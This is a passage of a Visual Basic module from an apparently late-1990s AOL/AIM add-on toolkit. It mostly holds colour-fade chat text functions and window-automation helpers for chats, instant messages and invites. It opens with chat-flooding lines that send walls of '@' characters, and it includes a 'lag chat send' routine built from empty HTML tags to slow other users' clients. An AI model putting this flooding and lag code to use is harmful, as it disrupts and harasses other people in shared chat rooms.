AiM_ChatSend ("<b>@@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@")
TimeOut 0.75
AiM_ChatSend ("<b>@@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@")
End Sub

Function AiM_BlackBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlackBlueBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlackGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlackGreenBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlackGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlackGreyBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlackPurple(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlackPurpleBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlackRed(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlackedRedBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlackRedBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlackYellow(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlackYellowBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlueBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlueBlackBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlueGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlueGreenBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BluePurple(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BluePurpleBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlueRed(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlueRedBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlueYellow(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BlueYellowBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("" + Msg + "")
End Function
Function AiM_BoldBlackBlueBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AiM_ChatSend ("<b>" + Msg + "")
End Function
Function AiM_BoldBlackGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AiM_ChatSend ("<b>" + Msg + "")
End Function
Function AiM_BoldBlackGreenBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AiM_ChatSend ("<b>" + Msg + "")
End Function
Function AiM_BoldBlackGrey(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("<b>" + Msg + "")
End Function
Function AiM_BoldBlackGreyBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AiM_ChatSend ("<b>" + Msg + "")
End Function
Function AiM_BoldBlackPurple(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AiM_ChatSend ("<b>" + Msg + "")
End Function
Function AiM_BoldBlackPurpleBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("<b>" + Msg + "")
End Function
Function AiM_BoldBlackRed(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AiM_ChatSend ("<b>" + Msg + "")
End Function
Function AiM_BoldBlackedRedBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AiM_ChatSend ("<b>" + Msg + "")
End Function
Function AiM_BoldBlackRedBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("<b>" + Msg + "")
End Function
Function AiM_BoldBlackYellow(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AiM_ChatSend ("<b>" + Msg + "")
End Function
Function AiM_BoldBlackYellowBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("<b>" + Msg + "")
End Function

Function AiM_BoldBlueBlack(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AiM_ChatSend ("<b>" + Msg + "")
End Function

Function AiM_BoldBlueBlackBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("<b>" + Msg + "")
End Function

Function AiM_BoldBlueGreen(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AiM_ChatSend ("<b>" + Msg + "")
End Function

Function AiM_BoldBlueGreenBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AiM_ChatSend ("<b>" + Msg + "")
End Function

Function AiM_BoldBluePurple(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AiM_ChatSend ("<b>" + Msg + "")
End Function

Function AiM_BoldBluePurpleBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AiM_ChatSend ("<b>" + Msg + "")
End Function

Function AiM_BoldBlueRed(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("<b>" + Msg + "")
End Function

Function AiM_BoldBlueRedBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AiM_ChatSend ("<b>" + Msg + "")
End Function

Function AiM_BoldBlueYellow(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AiM_ChatSend ("<b>" + Msg + "")
End Function

Function AiM_BoldBlueYellowBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AiM_ChatSend ("<b>" + Msg + "")
End Function

Function AoL4_BlackRedBlack(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_BlackRed(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_BlackPurpleBlack(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function

Sub AiM_ChatSend(Txt As String)

Chat1% = FindWindow("AIM_ChatWnd", vbNullString)
If Chat1% = 0 Then Exit Sub
    Chat2% = FindIt(Chat1%, "_Oscar_Separator")
    Chat3% = GetWindow(Chat2%, GW_HWNDNEXT)
    Chat4% = GetWindow(Chat3%, GW_HWNDNEXT)
    Chat5% = SenditByString(Chat3%, WM_SETTEXT, 0, Txt$)
Click (Chat4%)
TimeOut 0.3
End Sub
Sub AiM_GhostLetters(Txt As String)

Chat1% = FindWindow("AIM_ChatWnd", vbNullString)
If Chat1% = 0 Then Exit Sub
    Chat2% = FindIt(Chat1%, "_Oscar_Separator")
    Chat3% = GetWindow(Chat2%, GW_HWNDNEXT)
    Chat4% = GetWindow(Chat3%, GW_HWNDNEXT)
    SendKeys (Txt)
End Sub
Sub AiM_ClearChatText()

Clear1% = FindWindow("AIM_ChatWnd", vbNullString)
Clear2% = FindIt(Clear1%, "Ate32Class")
Clear3% = SenditByString(Clear2%, WM_SETTEXT, 0, "")
End Sub

Sub AiM_Attention(Txt)
AiM_ChatSend ("(-----Attention-----)")
AiM_ChatSend (Txt)
AiM_ChatSend ("(-----Attention-----)")
End Sub

Sub AiM_ImSend(Who As String, Wut As String)

      OpenIm1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
      OpenIm2% = FindIt(OpenIm1%, "_Oscar_TabGroup")
      OpenIm3% = FindIt(OpenIm2%, "_Oscar_IconBtn")
ClickIcon (OpenIm3%)
      Im1% = FindWindow("AIM_IMessage", vbNullString)
      Im2% = FindIt(Im1%, "_Oscar_PersistantComb")
      Im3% = FindIt(Im2%, "Edit")
      Im4% = SenditByString(Im3%, WM_SETTEXT, 0, Who$)
      Im5% = FindIt(Im1%, "Ate32class")
      Im6% = GetWindow(Im5%, GW_HWNDNEXT)
      Im7% = SenditByString(Im6%, WM_SETTEXT, 0, Wut$)
      Im8% = FindIt(Im1%, "_Oscar_IconBtn")
Click (Im8%)
End Sub

Sub AiM_OpenChatInvite()

Invites1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
Invites2% = FindIt(Invites1%, "_Oscar_TabGroup")
Invites3% = FindIt(Invites2%, "_Oscar_IconBtn")
Invites4% = GetWindow(Invites3%, GW_HWNDNEXT)
Click (Invites4%)
End Sub

Function AiM_UserSn()
On Error Resume Next
Sn1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
Sn2% = GetWindowTextLength(Sn1%)
Sn3$ = String$(Sn2%, 0)
Sn4% = GetWindowText(Sn1%, Sn3$, (Sn2% + 1))
If Not Right(Sn3$, 13) = "'s Buddy List" Then Exit Function
Sn5$ = Mid$(Sn3$, 1, (Sn2% - 13))
AiM_UserSn = Sn5$
End Function
Sub FormFade(FormX As Form, Colr1, Colr2)
'by monk-e-god (modified from a sub by MaRZ)
    B1 = GetRGB(Colr1).blue
    G1 = GetRGB(Colr1).Green
    R1 = GetRGB(Colr1).red
    B2 = GetRGB(Colr2).blue
    G2 = GetRGB(Colr2).Green
    R2 = GetRGB(Colr2).red
    
    On Error Resume Next
    Dim intLoop As Integer
    FormX.DrawStyle = vbInsideSolid
    FormX.DrawMode = vbCopyPen
    FormX.ScaleMode = vbPixels
    FormX.DrawWidth = 2
    FormX.ScaleHeight = 256
    For intLoop = 0 To 255
        FormX.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(((R2 - R1) / 255 * intLoop) + R1, ((G2 - G1) / 255 * intLoop) + G1, ((B2 - B1) / 255 * intLoop) + B1), B
    Next intLoop
End Sub

Sub FadeFormGrey(vForm As Form)
'Example:
'Private Sub Form_Paint()
'FadeFormGrey Me
'End Sub
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub
Sub FadeFormBlue(vForm As Form)
'Example:
'Private Sub Form_Paint()
'FadeFormBlue Me
'End Sub
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub
Function AiM_UserOnline()
Online% = FindWindow("_Oscar_BuddyListWin", vbNullString)
If Online% <> 0 Then
AiM_UserOnline = True
Else
AiM_UserOnline = False
End If
End Function

Sub AiM_HideAdd()
Hideit1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
Hideit2% = FindIt(Hideit1%, "Ate32Class")
Hideit3% = ShowWindow(Hideit2%, SW_HIDE)
End Sub

Function AiM_ShowAdd()
Showit1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
Showit2% = FindIt(Showit1%, "Ate32Class")
Showit3% = ShowWindow(Showit2%, SW_SHOW)
End Function

Sub AiM_SendChatInvite(Who As String, Message As String, ChatName As String)

Invites1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
Invites2% = FindIt(Invites1%, "_Oscar_TabGroup")
Invites3% = FindIt(Invites2%, "_Oscar_IconBtn")
Invites4% = GetWindow(Invites3%, GW_HWNDNEXT)
Click (Invites4%)
Invite1% = FindWindow("AIM_ChatInviteSendWnd", vbNullString)
Invite2% = FindIt(Invite1%, "Edit")
Invite3% = SenditByString(Invite2%, WM_SETTEXT, 0, Who$)
Invite4% = FindItsTitle(Invite1%, "Join me in this Buddy Chat.")
If Not Message$ = "" Then Call SenditByString(Invite4%, WM_SETTEXT, 0, Message$)
For Invite5% = 1 To 2
Invite4% = GetWindow(Invite4%, GW_HWNDNEXT)
Next Invite5%
If Not ChatName = "" Then Call SenditByString(Invite4%, WM_SETTEXT, 0, ChatName$)
Invite6% = FindIt(Invite1%, "_Oscar_IconBtn")
For Invite7% = 1 To 2
Invite6% = GetWindow(Invite6%, GW_HWNDNEXT)
Next Invite7%
Click (Invite6%)
End Sub

Sub AiM_EnterRoom(ChatName As String)
Invites1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
Invites2% = FindIt(Invites1%, "_Oscar_TabGroup")
Invites3% = FindIt(Invites2%, "_Oscar_IconBtn")
Invites4% = GetWindow(Invites3%, GW_HWNDNEXT)
Click (Invites4%)
Invite1% = FindWindow("AIM_ChatInviteSendWnd", vbNullString)
Invite2% = FindIt(Invite1%, "Edit")
Invite3% = SenditByString(Invite2%, WM_SETTEXT, 0, Who$)
Who$ = AiM_UserSn
Invite4% = FindItsTitle(Invite1%, "Join me in this Buddy Chat.")
If Not Message$ = "" Then Call SenditByString(Invite4%, WM_SETTEXT, 0, Message$)
Message$ = AiM_UserSn
For Invite5% = 1 To 2
Invite4% = GetWindow(Invite4%, GW_HWNDNEXT)
Next Invite5%
If Not ChatName = "" Then Call SenditByString(Invite4%, WM_SETTEXT, 0, ChatName$)
Invite6% = FindIt(Invite1%, "_Oscar_IconBtn")
For Invite7% = 1 To 2
Invite6% = GetWindow(Invite6%, GW_HWNDNEXT)
Next Invite7%
Click (Invite6%)
End Sub

Function AoL4_BlackGreyBlack(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ChatSend ("<Font Face=""Times New Roman"">" + Msg + "")
End Function
Sub Send(chatedit, god$)
SendTheText = SenditByString(chatedit, WM_SETTEXT, 0, god$)
End Sub
Function AoL4_Randomize10(Txt, txt2, txt3, txt4, txt5, txt6, txt7, txt8, txt9, txt10)
Randomize
 meeh = Int((Rnd * 10) + 1)
  If meeh = 1 Then Call AoL4_ChatSend(Txt)
  If meeh = 2 Then Call AoL4_ChatSend(txt2)
  If meeh = 3 Then Call AoL4_ChatSend(txt3)
  If meeh = 4 Then Call AoL4_ChatSend(txt4)
  If meeh = 5 Then Call AoL4_ChatSend(txt5)
  If meeh = 6 Then Call AoL4_ChatSend(txt6)
  If meeh = 7 Then Call AoL4_ChatSend(txt7)
  If meeh = 8 Then Call AoL4_ChatSend(txt8)
  If meeh = 9 Then Call AoL4_ChatSend(txt9)
 If meeh = 10 Then Call AoL4_ChatSend(txt10)
End Function

Function AoL4_Randomize5(Txt, txt2, txt3, txt4, txt5)
Randomize
 meeh = Int((Rnd * 5) + 1)
  If meeh = 1 Then Call AoL4_ChatSend(Txt)
  If meeh = 2 Then Call AoL4_ChatSend(txt2)
  If meeh = 3 Then Call AoL4_ChatSend(txt3)
  If meeh = 4 Then Call AoL4_ChatSend(txt4)
  If meeh = 5 Then Call AoL4_ChatSend(txt5)
'End If
End Function

Function AoL4_ChatSendLag(Txt)
    'This is a lag chat send..
    'Its really fucking lame so if i see you use it
    'I will term you if i do not know you
    'Why the hell did i put this in here.......
    
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = "<html>"
        h = "<html>"
        Msg = Msg & "<html><Font Color=#" & "<html>" & h & "></html><html>" & D & "<html>"
    Next b
    AoL4_ChatSend ("" + Msg + "")
End Function
Sub AoL4_Load()
x% = Shell("C:\aol40\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
x% = Shell("C:\aol40a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
x% = Shell("C:\aol40b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
End Sub
Sub AoL3_OpenMail(Which)
'Ie AoL3_OpenMail 1
If Which = 1 Then
Call AoL3_RunMenuByString("Read &New Mail")
End If

If Which = 2 Then
Call AoL3_RunMenuByString("Check Mail You've &Read")
End If

If Not Which = 1 Or Not Which = 2 Then
Call AoL3_RunMenuByString("Check Mail You've &Sent")
End If

End Sub
Sub AoL3_RunMenuByString(stringer As String)
Call RunMenuByString(AoL3_Window(), stringer)
End Sub

Function FindByTitle(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)

While firs%
firss% = GetWindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) & "*" Then GoTo bone
firs% = GetWindow(firs%, 2)
